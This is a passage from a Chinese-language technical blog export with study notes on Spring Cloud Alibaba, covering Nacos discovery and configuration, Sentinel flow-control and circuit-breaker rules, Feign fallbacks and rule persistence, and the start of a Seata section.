<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">83</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">nacos-order-consumer</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="string">localhost:8848</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 消费者将要去访问的微服务名称（注册成功进nacos的微服务提供者）</span></span><br><span class="line"></span><br><span class="line"><span class="attr">service-url:</span></span><br><span class="line">  <span class="attr">nacos-user-service:</span> <span class="string">http://nacos-payment-provider</span></span><br><span class="line">  </span><br></pre></td></tr></table></figure>
<p>然后他需要配置restTemplate，在业务类中也可以使用到yml中配置的servcie-url<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(11)-2023-11-18-20-06.png"><br><strong>业务类：</strong></p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">OrderNacosController</span> &#123;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">lateinit</span> <span class="keyword">var</span> restTemplate: RestTemplate</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(<span class="string">&quot;\$&#123;service-url.nacos-user-service&#125;&quot;</span>)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">lateinit</span> <span class="keyword">var</span> serverURL: String</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(<span class="string">&quot;/consumer/payment/nacos/&#123;id&#125;&quot;</span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">paymentInfo</span><span class="params">(<span class="meta">@PathVariable(<span class="string">&quot;id&quot;</span>)</span> id: <span class="type">Long</span>)</span></span>: String &#123;</span><br><span class="line">        <span class="keyword">return</span> restTemplate.getForObject(serverURL+<span class="string">&quot;/payment/nacos/<span class="variable">$id</span>&quot;</span> ,String::<span class="keyword">class</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="CP-AP的选择和使用"><a href="#CP-AP的选择和使用" class="headerlink" title="CP+AP的选择和使用"></a>CP+AP的选择和使用</h3><p><img src="https://image.zfxt.top/hexo-blog/SpringCloud(11)-2023-11-08-07-33.png"></p>
<h2 id="服务配置中心"><a href="#服务配置中心" class="headerlink" title="服务配置中心"></a>服务配置中心</h2><ul>
<li>基础配置信息<br><strong>POM：</strong><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--nacos-config--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-nacos-config<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--nacos-discovery--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-nacos-discovery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<strong>YML:</strong></li>
</ul>
<ol>
<li><p>bootstrap.yml</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># nacos配置</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">3377</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">nacos-config-client</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="string">localhost:8848</span> <span class="comment">#Nacos作为服务注册中心</span></span><br><span class="line">      <span class="attr">config:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="string">localhost:8848</span> <span class="comment">#Nacos作为服务配置中心</span></span><br><span class="line">        <span class="attr">file-extension:</span> <span class="string">yaml</span> <span class="comment"># 指定需要yaml格式的配置</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>application.yml</p>
</li>
</ol>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">profiles:</span></span><br><span class="line">    <span class="attr">active:</span> <span class="string">dev</span> <span class="comment"># 表示开发环境</span></span><br></pre></td></tr></table></figure>
<p><strong>主启动类：</strong></p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableDiscoveryClient</span></span><br><span class="line"><span class="keyword">open</span> <span class="keyword">class</span> <span class="title class_">NacosClient3377</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args: <span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span> &#123;</span><br><span class="line">    runApplication&lt;NacosClient3377&gt;(*args)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>业务类：</strong></p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RefreshScope</span> <span class="comment">//支持Nacos的动态刷新功能</span></span><br><span class="line"><span class="keyword">open</span> <span class="keyword">class</span> <span class="title class_">ConfigInfoController</span> &#123;</span><br><span class="line">    <span class="meta">@Value(<span class="string">&quot;\$&#123;config.info&#125;&quot;</span>)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">lateinit</span> <span class="keyword">var</span> configInfo: String</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(<span class="string">&quot;/configInfo&quot;</span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">getConfigInfo</span><span class="params">()</span></span>: String &#123;</span><br><span class="line">        <span class="keyword">return</span> configInfo</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>匹配规则：</strong><br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(11)-2023-11-17-28-45.png"></p>
<p>然后在nacos服务中添加一个配置项<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(11)-2023-11-09-14-34.png"></p>
<blockquote>
<p>这里说明一个错误<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(11)-2023-11-03-25-37.png"><br>详见(<a href="https://zfxt.top/index.php/archives/411/">https://zfxt.top/index.php/archives/411/</a>)<br>在这里使用时，很明显，RefreshScoping他会动态生成。也就是会额外的创建，因此我们需要给与他open也就是允许被修改的权限，同时，我们需要保证他的安全性，在这里private是无法使用的，private和open不能同时使用。他们定义相冲突。因此我选择使用了protected</p>
</blockquote>
<p><strong>在使用NACOS的话，你修改了配置，他可以自动更新并加载。也就是代替了原本的POST更新请求和bus总线</strong></p>
<h2 id="Nacos的分类管理"><a href="#Nacos的分类管理" class="headerlink" title="Nacos的分类管理"></a>Nacos的分类管理</h2><p><img src="https://image.zfxt.top/hexo-blog/SpringCloud(11)-2023-11-20-52-21.png"></p>
<ol>
<li>DataID方案<br>就是修改spring.profiles.active 常用的有dev，test等</li>
<li>Group方案<br>在Nacos的图形化界面为配置文件添加Group，然后在bootstrap.yml下的config下添加一个group属性即可<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(11)-2023-11-04-37-09.png"></li>
<li>NameSpace方案<br>在Nacos中建立新的命名空间。他会生成一些对应的namespaceID。<br>然后再bootstrap.yml中可以添加如下：<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(11)-2023-11-09-43-12.png"></li>
</ol>
<h2 id="Nacos集群和持久化配置"><a href="#Nacos集群和持久化配置" class="headerlink" title="Nacos集群和持久化配置"></a>Nacos集群和持久化配置</h2><p><img src="https://image.zfxt.top/hexo-blog/SpringCloud(11)-2023-11-09-06-43.png"><br><a href="https://nacos.io/zh-cn/docs/cluster-mode-quick-start.html">https://nacos.io/zh-cn/docs/cluster-mode-quick-start.html</a></p>
<h3 id="持久化配置"><a href="#持久化配置" class="headerlink" title="持久化配置"></a>持久化配置</h3><p>将内嵌式数据库替换成mysql高可用数据源。保证数据的一致性<br>从derby到mysql的切换：<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(11)-2023-11-15-52-21.png"><br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(11)-2023-11-06-42-36.png"></p>
<blockquote>
<p>启动的集群的cluster配置方式不能是127.0.0.1,linux无法识别</p>
</blockquote>
<p>shell命令，添加新端口启动方式<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(11)-2023-11-15-24-31.png"><br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(11)-2023-11-09-40-02.png"></p>
]]></content>
      <categories>
        <category>springcloud</category>
      </categories>
  </entry>
  <entry>
    <title>SpringCloud(12)</title>
    <url>/posts/39873c26/</url>
    <content><![CDATA[<h1 id="Sentinel-分布式系统的流量防卫兵"><a href="#Sentinel-分布式系统的流量防卫兵" class="headerlink" title="Sentinel 分布式系统的流量防卫兵"></a>Sentinel 分布式系统的流量防卫兵</h1><p><img src="https://image.zfxt.top/hexo-blog/SpringCloud(12)-2023-11-04-34-27.png"><br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(12)-2023-11-22-35-24.png"></p>
<ul>
<li>下载安装<br><a href="https://github.com/alibaba/Sentinel/releases/tag/1.8.6">https://github.com/alibaba/Sentinel/releases/tag/1.8.6</a><br>启动后默认端口为8080</li>
<li>构建微服务：<br><strong>POM：</strong><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--       Springcloud ailibaba nacos --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-nacos-discovery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--Springcloud ailibaba sentinel-datasource-nacos后续做特久化用到 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.csp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>sentinel-datasource-nacos<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--Springcloud ailibaba sentinel --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-sentinel<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--openfeign--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-openfeign<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--SpringBoot.整合web组件+actuator--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.jetbrains.kotlin<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>kotlin-reflect<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>YML:</strong></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8401</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloudalibaba-sentinel-service</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="string">localhost:8848</span></span><br><span class="line">    <span class="attr">sentinel:</span></span><br><span class="line">      <span class="attr">transport:</span></span><br><span class="line">        <span class="attr">dashboard:</span> <span class="string">localhost:8080</span></span><br><span class="line">        <span class="comment"># 默认为8719端口，假如8719被占用，会依次+1，直到找到未使用端口</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">8719</span></span><br><span class="line"></span><br><span class="line"><span class="attr">management:</span></span><br><span class="line">  <span class="attr">endpoints:</span></span><br><span class="line">    <span class="attr">web:</span></span><br><span class="line">      <span class="attr">exposure:</span></span><br><span class="line">        <span class="attr">include:</span> <span class="string">&quot;*&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>Sentinel采用的懒加载模式：也就是只有当微服务被访问时才会加载出来</strong></p>
<h3 id="流控规则"><a href="#流控规则" class="headerlink" title="流控规则"></a>流控规则</h3><p><img src="https://image.zfxt.top/hexo-blog/SpringCloud(12)-2023-11-08-13-57.png"><br>资源名：唯一名称，默认请求路径<br>针对来源：Sentinel可以针对调用者进行限流，填写微服务名，默认default(不区分来源)<br>阈值类型单机阈值：</p>
<ul>
<li>QPS(每秒钟的请求数量)：当调用该api的QPS达到阈值的时候，进行限流</li>
<li>线程数：当调用该api的线程数达到阈值的时候，进行限流<br>是否集群：不需要集群<br>流控模式：</li>
<li>直接：api达到限流条件时，直接限流</li>
<li>关联：当关联的资源达到阈值时，就限流自己</li>
<li>链路：只记录指定涟路上的流量（指定资源从入口资源进来的流量，如果达到阈值，就进行限流)【api级别的针对来源】<br>流控效果：</li>
<li>快速失败：直接失败，抛异常</li>
<li>Warm Up:根据codeFactor(冷加载因子，默认3)的值，从阈值&#x2F;codeFactor,经过预热时长，才达到设置的QPS阈值</li>
<li>排队等待:匀速排队，让请求以匀速的速度通过，阈值类型必须设置为QPS，否则无效</li>
</ul>
<h3 id="降级规则"><a href="#降级规则" class="headerlink" title="降级规则"></a>降级规则</h3><p><img src="https://image.zfxt.top/hexo-blog/SpringCloud(12)-2023-11-10-57-46.png"></p>
<blockquote>
<p>Sentinel熔断降级会在调用链路中某个资源出现不稳定状态时（例如调用超时或异常比例升高），对这个资源的调用进行限制<br>让请求快速失败，避免影响到其它的资源而导致级联错误。<br>当资源被降级后，在接下来的降级时间窗口之内，对该资源的调用都自动熔断（默认行为是抛出DegradeException)。</p>
</blockquote>
<ul>
<li><p>RT(平均响应时间，秒级)<br>平均响应时间 <strong>超出阈值</strong> 且 <strong>在时间窗口内通过的请求&gt;&#x3D;5</strong>，两个条件同时满足后触发降级<br>窗口期过后关闭断路器<br>RT最大4900（更大的需要通过-Dcsp.sentinel..statistic.max.rt&#x3D;XXXX才能生效）</p>
</li>
<li><p>异常比列（秒级）<br>每秒QPS&gt;&#x3D;5且异常比例（秒级统计）超过阈值时，触发降级；时间窗口结束后，关闭降级</p>
</li>
<li><p>异常数(DEGRADE_GRADE_EXCEPTION_COUNT)<br>当资源近1分钟的异常数目超过阈值之后会进行熔断。注意由于统计时间窗口是分钟级别的，若timeWindow小于60s,则结束熔断状态后好可能再进入熔断状态。</p>
</li>
</ul>
<h3 id="热点规则"><a href="#热点规则" class="headerlink" title="热点规则"></a>热点规则</h3><p><img src="https://image.zfxt.top/hexo-blog/SpringCloud(12)-2023-11-06-49-03.png"><br>限制你的参数访问量<br>资源名是否加斜线，将会对应到他是从GetMapping（rest地址）获取的还是从SentinelResource获取的（也就是作为唯一标识）</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(<span class="string">&quot;/testHotKey&quot;</span>)</span></span><br><span class="line">    <span class="meta">@SentinelResource(<span class="string">&quot;testHotKey&quot;</span>, blockHandler = <span class="string">&quot;dealTestHotKey&quot;</span>)</span></span><br><span class="line">     <span class="keyword">open</span> <span class="function"><span class="keyword">fun</span> <span class="title">testHotKey</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="meta">@RequestParam(value = <span class="string">&quot;p1&quot;</span>, required = false)</span> p1: <span class="type">String</span>?,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="meta">@RequestParam(value = <span class="string">&quot;p2&quot;</span>, required = false)</span> p2: <span class="type">String</span>?</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>: String &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;test 测试热点数据&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">open</span> <span class="function"><span class="keyword">fun</span> <span class="title">dealTestHotKey</span><span class="params">(p1: <span class="type">String</span>?, p2: <span class="type">String</span>? ,e:<span class="type">BlockException</span>)</span></span>: String &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;deal_hotkey&quot;</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h4 id="兜底方法（也就是限流，熔断后的反馈方法-fallback-）"><a href="#兜底方法（也就是限流，熔断后的反馈方法-fallback-）" class="headerlink" title="兜底方法（也就是限流，熔断后的反馈方法{fallback}）"></a>兜底方法（也就是限流，熔断后的反馈方法{fallback}）</h4><p><strong>从HystrixCommand到@SentinelResource</strong><br><strong>使用blockHandler必须保证后面还需要一个BlockException的参数</strong></p>
<blockquote>
<p>@SentinelResource<br>处理的是Sentinel控制台配置的违规情况，有blockHandler方法配置的兜底处理；<br>RuntimeException<br>int age&#x3D; 10&#x2F;0,这个是java运行时报出的运行时异常RunTimeException,@SentinelResource不管</p>
</blockquote>
<h3 id="系统规则"><a href="#系统规则" class="headerlink" title="系统规则"></a>系统规则</h3><p><img src="https://image.zfxt.top/hexo-blog/SpringCloud(12)-2023-11-01-01-27.png"></p>
<p><strong>系统自适应限流：也就是将整个应用完全包裹起来，在应用外设置限流</strong><br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(12)-2023-11-22-43-13.png"></p>
<p>系统保护规则是从应用级别的入口流量进行控制，从单台机器的Load、CPU使用率、平均RT、入口QPS和并发线程数等几个维度监控应用指标，让系统尽可能跑在最大吞吐量的同时保证系统整体的稳定性。<br>系统保护规则是应用整体维度的，而不是资源维度的，并且仅对入口流量生效。入口流量指的是进入应用的流量(EntryType.IN),比如Web服务或Dubbo服务端接收的请求，都属于入口流量。<br>系统规则支持以下的模式：</p>
<ul>
<li>Load自适应（仅对inux&#x2F;Unix-like机器生效）：系统的load1作为启发指标，进行自适应系统保护。当系统lod1超过设定的启发值，且系统当前的并发线程数超过估算的系统容量时才会触发系统保护(BBR阶段)。系统容量由系统的max Qps<em>mint估算得出。设定参考值一般是CPU cores</em>2.5。</li>
<li>CPU usage(1.5.0+版本)：当系统CPU使用率超过阈值即触发系统保护（取值范围0.0-1.0),比较灵敏。</li>
<li>平均RT:当单台机器上所有入口流量的平均RT达到阈值即触发系统保护，单位是毫秒。</li>
<li>并发线程数：当单台机器上所有入口流量的并发线程数达到阈值即触发系统保护。</li>
<li>入口QPS:当单台机器上所有入口流量的QPS达到阈值即触发系统保护。</li>
</ul>
<h3 id="详细SentinelResource讲解"><a href="#详细SentinelResource讲解" class="headerlink" title="详细SentinelResource讲解"></a>详细SentinelResource讲解</h3><p><img src="https://image.zfxt.top/hexo-blog/SpringCloud(12)-2023-11-07-45-02.png"></p>
<h4 id="解耦"><a href="#解耦" class="headerlink" title="解耦"></a>解耦</h4><p>统一的处理兜底方法：<br>使用<code>blockHandlerClass</code>来统一处理。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SentinelResource(blockHandlerclass=CustomerBlockHandler.class,blockHandler=&quot;handlerException2&quot;)</span>)</span><br><span class="line">···</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomerBlockHandler</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> CommonResult <span class="title function_">handlerException1</span><span class="params">(BlockException exception)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">CommonResult</span>(<span class="number">4444</span>,<span class="string">&quot;按客戶自定义，global hand1 erException---1&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> CommonResult <span class="title function_">handlerException2</span><span class="params">(BlockException exception)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">CommonResult</span>(<span class="number">4444</span>,<span class="string">&quot;按客戶自定义，global handlerException---2&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="服务熔断"><a href="#服务熔断" class="headerlink" title="服务熔断"></a>服务熔断</h3><p><strong>sentinel整合ribbon+openfeign+fallback</strong></p>
<ul>
<li>fallback：解决运行时异常<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(12)-2023-11-12-36-19.png"><br>需要使用<code>@PathVariable</code>来获取参数</li>
<li>blockHandler：解决配置违规</li>
</ul>
<p><strong>可以同时配置fallback和blockHandler。但是blockHandler的优先级更高。</strong></p>
<h4 id="异常忽略"><a href="#异常忽略" class="headerlink" title="异常忽略"></a>异常忽略</h4><p>即不再帮助解决异常和错误问题。而是使用系统默认的解决方案<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(12)-2023-11-08-51-52.png"></p>
<h3 id="Feign"><a href="#Feign" class="headerlink" title="Feign"></a>Feign</h3><p><strong>POM：</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--openfeign--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-openfeign<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>YML:</strong></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">feigh:</span></span><br><span class="line">	<span class="attr">sentinel:</span></span><br><span class="line">			<span class="attr">enabled:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p><strong>主启动添加@EnableFeignClients</strong></p>
<p><strong>业务类：接口+注解</strong><br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(12)-2023-11-08-38-51.png">实现他的fallback类<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(12)-2023-11-09-26-49.png"></p>
<h3 id="规则持久化"><a href="#规则持久化" class="headerlink" title="规则持久化"></a>规则持久化</h3><p>每次重启微服务都会导致所有规则消失，因此需要配置持久化<br>所以把他保持到nacos中<br><strong>POM：</strong>：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--Springcloud ailibaba sentinel-datasource-nacos后续做特久化用到 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.csp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>sentinel-datasource-nacos<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>YML:</strong></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloudalibaba-sentinel-service</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="string">localhost:8848</span></span><br><span class="line">    <span class="attr">sentinel:</span></span><br><span class="line">      <span class="attr">transport:</span></span><br><span class="line">        <span class="attr">dashboard:</span> <span class="string">localhost:8080</span></span><br><span class="line">        <span class="comment"># 默认为8719端口，假如8719被占用，会依次+1，直到找到未使用端口</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">8719</span></span><br><span class="line">      <span class="attr">datasource:</span></span><br><span class="line">        <span class="attr">ds1:</span></span><br><span class="line">          <span class="attr">nacos:</span></span><br><span class="line">            <span class="attr">server-addr:</span> <span class="string">localhost:8848</span></span><br><span class="line">            <span class="attr">data-id:</span> <span class="string">cloudalibaba-sentinel-service</span></span><br><span class="line">            <span class="attr">group-id:</span> <span class="string">DEAULT_GROUP</span></span><br><span class="line">            <span class="attr">data-type:</span> <span class="string">json</span></span><br><span class="line">            <span class="attr">rule-type:</span> <span class="string">flow</span></span><br></pre></td></tr></table></figure>
<p>然后在nacos中添加一个与上面data-id相同的配置，也就是application.name<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(12)-2023-11-07-26-56.png"><br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(12)-2023-11-04-19-04.png"></p>
]]></content>
      <categories>
        <category>springcloud</category>
      </categories>
  </entry>
  <entry>
    <title>SpringCloud(13)</title>
    <url>/posts/209c0d67/</url>
    <content><![CDATA[<h1 id="Seata处理分布式事务"><a href="#Seata处理分布式事务" class="headerlink" title="Seata处理分布式事务"></a>Seata处理分布式事务</h1><p><strong>问题</strong>：(有多个库，如何保持一致，在物理上有多个数据库，但逻辑上保持一个数据库)<br>单体应用被拆分成微服务应用，原来的三个模块被拆分成三个独立的应用，分别使用三个独立的数据源。<br>业务操作需要调用三个服务来完成。此时每个服务内部的数据一致性由本地事务来保证，但是全局的数据一致性问题没法保证。</p>
<p>官网地址：<a href="https://seata.io/zh-cn/">https://seata.io/zh-cn/</a></p>
<h3 id="Seata组成"><a href="#Seata组成" class="headerlink" title="Seata组成"></a>Seata组成</h3><ol>
<li>全局唯一的事务ID</li>
